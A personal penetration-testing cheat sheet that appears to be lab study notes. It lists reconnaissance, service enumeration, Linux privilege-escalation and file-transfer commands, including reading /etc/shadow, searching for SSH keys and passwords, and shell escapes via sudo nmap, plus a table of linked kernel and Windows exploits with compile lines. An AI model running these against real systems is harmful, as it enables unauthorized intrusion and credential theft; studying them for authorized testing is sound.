# stuff I picked up on the internet

## Phase 1 - Reconnaissance
* Collect public information about the victim
* Company Website
* Social Media (Linkedin, FB, Twitter, etc. for company and/or people)

|Command|Result|
|---|---
|`dmitry victim`|A lot!!
|`theharvester -d victim -b all`|Juicy info from various sources
|`whois --verbose victim`|Public domain info
|`https://archive.org`|Previous looks of a the website
|`curl`|TBD
|`host victim`|TBD
|`intitle` `allintitle`<td rowspan=7>Various Google Hacks
|`inurl` `allinurl`
|`filetype`
|`ext`
|`intext` `allintext`
|`site`
|`https://www.exploit-db.com/google-hacking-database`
|`http://www.serversniff.net`<td rowspan=3>Various networking tools
|`http://geektools.com`
|`http://network-tools.com`

## Phase 2 - Remote Enumeration and Pre-Exploitation
* Enumerate each services
* Identify possible vulnerabilities of each services
* Verify each vulnerabilities
* Prioritize vulnerabilities

|Command|Result
|---|---
|`nbtscan`|netbios name
|`nmap -sn x.x.x.x/24`<td rowspan=2>Lists machines that respond to ping
|`nmap -sP x.x.x.*`
|`nmap -A -T4 -F --open victim`|Scans top 100 TCP ports
|`nmap -A -sU -T4 -F --open victim`|Scans top 100 UDP ports
|`nmap -A -p- -T4 --reason victim`|Scans all TCP ports
|`nmap -T4 -sU --reason victim`|Scans all UDP ports
|`nc`|TBD
|`ncat`|TBD
|`unicornscan`|TBD
|`wireshark`|TBD
|`traceroute`|TBD
|`maltego`|TBD
|`arping`|Layer 2 TBD
|`netdiscovery`|Layer 2 TBD
|`fping`|Layer 3 TBD
|`hping3`|Layer 3 TBD
|`p0f`|TBD
|`net`|TBD
|`nmblookup`|TBD
|`zaproxy`|TBD
|``|TBD
|`cewl`|TBD
|`john`|TBD
|`medusa`|TBD
|`Hashcat`|TBD
|`pwdump`|TBD
|`fgdump`|TBD
|`pth`|TBD
|``|TBD
|``|TBD
|``|TBD

|Port|Service|Command|Result
|---|---|---|---
|21|FTP|``|TBD
|22|SSH|``|TBD
|23|Telnet|``|TBD
|53<td rowspan=3>DNS|`dnsenum`<td rowspan=3>DNS stuff
|53|`dnsrecon -d victim.com -a`
|53|`host victim`
|67/8|DHCP|``|TBD
|69|FTP|``|TBD
|80/443<td rowspan=5>http/s|`GoBuster`<td rowspan=4>Fuzzing directories
|80/443|`dirb victim`
|80/443|`nikto -h victim`
|80/443|`dirbuster`
|80/443|`Burp`|TBD
|110|POP3|``|TBD
|135/7/8/9<td rowspan=5>RPC/SMB/NetBIOS|`enum4linux -a victim`<td rowspan=3>Enumerate
|135/7/8/9/445|`nbtscan -r victim`
|135/7/8/9/445|`nmap -p 135,137,138,139,445 --script "smb*"`
|135/7/8/9/445|`smbclient`<td rowspan=2>TBD
|135/7/8/9/445|`rpcclient -U "" victim`
|161/2<td rowspan=7>SNMP|`echo public > community; echo private >> community; echo manager >> community; for ip in $(seq 200 254); do echo 10.11.1.${ip}; done > ips; onesixtyone -c community -i ips`| Fuzzing community strings
|161/2|`snmpenum victim community`<td rowspan=2>TBD
|161/2|`snmp-check`
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.4.1.77.1.2.25`|windows users
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.25.4.2.1.2`|current Windows processes
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.6.13.1.3`|Windows’ open TCP ports
|161/2|`snmpwalk -c public -v1 victim 1.3.6.1.2.1.25.6.3.1.2`|installed software

## Phase 3 - Remote Exploitation
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700 (buffer overflow)  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 4379 -q 46367046 (buffer overflow)  
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb (buffer overflow)

sudo apt-get install mingw-w64 | i686-w64-mingw32-gcc -o main32.exe main.c | x86_64-w64-mingw32-gcc -o main64.exe main.c (buffer overflow)  
i686-w64-mingw32-gcc (buffer overflow)  

|Command|Result
|---|---
|`msfvenom`|TBD
|`edb`|TBD
|`gcc`|TBD
|`mingw`|TBD
|`wine`|TBD
|`mingw-w64`|TBD
|`i686-w64-mingw32-gcc`|TBD
|``|TBD

## Phase 4 - Local Enumeration and Pre-Exploitation
* Enumerate services and others
* Identify possible vulnerabilities of each services


## Phase 5 - Local Exploitation
|Command|Result
|---|---
|**Linux**||
|**Kernel, OS & Device Information**||
|`uname -a`|Print all available system information
|`uname -r`|Kernel release
|`uname -n`|System hostname
|`hostname`|As above
|`uname -m`|Linux kernel architecture (32 or 64 bit)
|`cat /proc/version`|Kernel information
|`cat /etc/*-release`|Distribution information
|`cat /etc/issue`|As above
|`cat /proc/cpuinfo`|CPU information
|`df -a`|File system information
|**Users & Groups**||
|`cat /etc/passwd`|List all users on the system
|`cat /etc/group`|List all groups on the system
|`for i in $(cat /etc/passwd 2>/dev/null PIPE cut -d":" -f1 2>/dev/null);do id $i;done 2>/dev/null`|List all uid’s and respective group memberships
|`cat /etc/shadow`|Show user hashes
|`grep -v -E "^#" /etc/passwd PIPE awk -F: '$3 == 0 { print $1}'`|List all super user accounts
|`finger`|Users currently logged in
|`pinky`|As above
|`users`|As above
|`who -a`|As above
|`w`|Who is currently logged in and what they’re doing
|`last`|Listing of last logged on users
|`lastlog`|Information on when all users last logged in
|`lastlog –u %username%`|Information on when the specified user last logged in
|`lastlog PIPE grep -v "Never"`|Entire list of previously logged on users
|**User & Privilege Information**||
|`whoami`|Current username
|`id`|Current user information
|`cat /etc/sudoers`|Who’s allowed to do what as root
|`sudo -l`|Can the current user perform anything as root
|**Environmental Information**||
|`env`|Display environmental variables
|`set`|As above
|`echo $PATH`|Path information
|`history`|Displays command history of current user
|`pwd`|Print working directory, i.e. ‘where am I’
|`cat /etc/profile`|Display default system variables
|`cat /etc/shells`|Display available shells
|**Interesting Files**||
|`find / -perm -4000 -type f 2>/dev/null`|Find SUID files
|`find / -uid 0 -perm -4000 -type f 2>/dev/null`|Find SUID files owned by root
|`find / -perm -2000 -type f 2>/dev/null`|Find GUID files
|`find / -perm -2 -type f 2>/dev/null`|Find world-writeable files
|`find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null`|Find world-writeable files excluding those in /proc
|`find / -perm -2 -type d 2>/dev/null`|Find word-writeable directories
|`find /home –name *.rhosts -print 2>/dev/null`|Find rhost config files
|`find /home -iname *.plan -exec ls -la {} ; -exec cat {} 2>/dev/null ;`|Find *.plan files, list permissions and cat the file contents
|`find /etc -iname hosts.equiv -exec ls -la {} 2>/dev/null ; -exec cat {} 2>/dev/null ;`|Find hosts.equiv, list permissions and cat the file contents
|`ls -ahlR /root/`|See if you can access other user directories to find interesting files
|`cat ~/.bash_history`|Show the current users’ command history
|`ls -la ~/.*_history`|Show the current users’ various history files
|`ls -la /root/.*_history`|Can we read root’s history files
|`ls -la ~/.ssh/`|Check for interesting ssh files in the current users’ directory
|`find / -name "id_dsa*" -o -name "id_rsa*" -o -name "known_hosts" -o -name "authorized_hosts" -o -name "authorized_keys" 2>/dev/null PIPE xargs -r ls -la`|Find SSH keys/host information
|`ls -la /usr/sbin/in.*	`|Check Configuration of inetd services
|`grep -l -i pass /var/log/*.log 2>/dev/null`|Check log files for keywords (‘pass’ in this example) and show positive matches
|`find /var/log -type f -exec ls -la {} ; 2>/dev/null`|List files in specified directory (/var/log)
|`find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null`|List .log files in specified directory (/var/log)
|`find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} ; 2>/dev/null`|List .conf files in /etc (recursive 1 level)
|`ls -la /etc/*.conf`|As above
|`find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null`|Find .conf files (recursive 4 levels) and output line number where the word ‘password’ is located
|`lsof -i -n`|List open files (output will depend on account privileges)
|`head /var/mail/root`|Can we read roots mail
|**Service Information**||
|`ps aux PIPE grep root`|View services running as root
|`ps aux PIPE awk '{print $11}' PIPE xargs -r ls -la 2>/dev/null PIPE awk '!x[$0]++'`|Lookup process binary path and permissions
|`cat /etc/inetd.conf`|List services managed by inetd
|`cat /etc/xinetd.conf`|As above for xinetd
|`cat /etc/xinetd.conf 2>/dev/null PIPE awk '{print $7}' PIPE xargs -r ls -la 2>/dev/null`|A very ‘rough’ command to extract associated binaries from xinetd.conf and show permissions of each
|`ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null`|Permissions and contents of /etc/exports (NFS)
|**Jobs/Tasks**||
|`crontab -l -u %username%`|Display scheduled jobs for the specified user
|`ls -la /etc/cron*`|Scheduled jobs overview (hourly, daily, monthly etc)
|`ls -aRl /etc/cron* PIPE awk '$1 ~ /w.$/' 2>/dev/null`|What can ‘others’ write in /etc/cron* directories
|`top`|List of current tasks
|**Networking, Routing & Communications**||
|`/sbin/ifconfig -a`|List all network interfaces
|`cat /etc/network/interfaces`|As above
|`arp -a`|Display ARP communications
|`route`|Display route information
|`cat /etc/resolv.conf`|Show configured DNS sever addresses
|`netstat -antp`|List all TCP sockets and related PIDs
|`netstat -anup`|List all UDP sockets and related PIDs
|`iptables -L`|List rules
|`cat /etc/services`|View port numbers/services mappings
|**Programs Installed**||
|`dpkg -l`|Installed packages (Debian)
|`rpm -qa`|Installed packages (Red Hat)
|`sudo -V`|Sudo version – does an exploit exist?
|`httpd -v`|Apache version
|`apache2 -v`|As above
|`apache2ctl (or apachectl) -M`|List loaded Apache modules
|`mysql --version`|Installed MYSQL version details
|`psql -V`|Installed Postgres version details
|`perl -v`|Installed Perl version details
|`java -version`|Installed Java version details
|`python --version`|Installed Python version details
|`ruby -v`|Installed Ruby version details
|`find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc)`|Locate ‘useful’ programs (netcat, wget etc)
|`which %program_name% (i.e. nc, netcat, wget, nmap etc)`|As above
|`dpkg --list 2>/dev/null PIPE grep compiler PIPE grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null PIPE grep gcc 2>/dev/null`|List available compilers
|`cat /etc/apache2/envvars 2>/dev/null PIPE grep -i 'user PIPE group' PIPE awk '{sub(/.*export /,"")}1'`|Which account is Apache running as
|**Common Shell Escape Sequences**||
|`:!bash`|vi, vim
|`:set shell=/bin/bash:shell`|vi, vim
|`!bash`|man, more, less
|`find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; `|find
|`awk 'BEGIN {system("/bin/bash")}'`|awk
|`--interactive`|nmap
|`echo "os.execute('/bin/sh')" > exploit.nse`|nmap
|`sudo nmap --script=exploit.nse`|nmap
|`perl -e 'exec "/bin/bash";'`|Perl

## Phase 6 - Post-Exploitation
tftp (file transfer)  
pure-ftpd (file transfer)  
cscript wget.vbs httpaddress file.exe (file transfer)  
powersploit (file transfer)  
meshang (file transfer)?  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 (file transfer) (win)  
pyinstaller (privilege escalation) (win)  
pywin32-218.win32-py2.7.exe (privilege escalation) (win)  
icacls <filename> (privilege escalation) (win)  
Get-WmiObject (privilege escalation) (win)  
AccessChk (privilege escalation) (win)  


# Working Exploits
* Just because it says 1.1 doesn't mean it doesn't work on 1.0

|Type|Notes|Product|URL
|---|---|---|---
|Remote||Wordpress wp-forum SQL Injection|https://cxsecurity.com/issue/WLB-2013020035
|Remote||Cuppa CMS 'alertConfigField.php' Remote / Local File Inclusion|https://www.exploit-db.com/exploits/25971/
|Remote||PHPLiteAdmin 1.9.3 Remote PHP Code Injection|https://www.exploit-db.com/exploits/24044/
|Remote||Samba 2.2.8 - Remote Code Execution|https://www.exploit-db.com/exploits/10/
|Local/Escalation|`gcc exploit.c -o exploit`|FreeBSD 9.0Intel SYSRET Kernel Privilege Escalation|https://www.exploit-db.com/exploits/28718/
|Local/Escalation|`gcc -o exploit exploit.c`|Linux Kernel 2.4.x/2.6.x 'sock_sendpage()' Privilege Escalation|https://www.exploit-db.com/exploits/9545/
|Local/Escalation|`i686-w64-mingw32-gcc exploit.c -lws2_32 -o exploit.exe`|Microsoft Windows (x86) 'afd.sys' Privilege Escalation (MS11-046)|https://www.exploit-db.com/exploits/40564/
|Local/Escalation||Microsoft Windows XP/2000 - 'Mrxsmb.sys' Privilege Escalation (PoC) (MS06-030)|https://www.exploit-db.com/exploits/1911/
|Local/Escalation|#include <string.h>`gcc exploit.c -o exploit`|Microsoft Windows 'RPC DCOM' Remote Exploit (Universal)|https://www.exploit-db.com/exploits/76/
|Local/Escalation|`gcc -pthread dirty.c -o dirty -lcrypt`|Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)|https://www.exploit-db.com/exploits/40839/
|Local/Escalation|`gcc -o exploit exploit.c`|Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Integer Overflow Privilege Escalation|https://www.exploit-db.com/exploits/1397/
|Local/Escalation|`#include <stdio.h>, <string.h>, <stdlib.h>` stat -> strcat `gcc -o exploit exploit.c -Wl,--hash-style=both`|Linux Kernel < 2.6.22 - 'ftruncate()/open()' Privilege Escalation|https://www.exploit-db.com/exploits/6851/
|Local/Escalation|`gcc -o exploit exploit.c -Wl,--hash-style=both`|Linux Kernel 2.6.x - 'pipe.c' Privilege Escalation (2)|https://www.exploit-db.com/download/33322
|Local/Escalation|``|Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' '/proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)|https://www.exploit-db.com/exploits/40847/
|Local/Escalation|``||
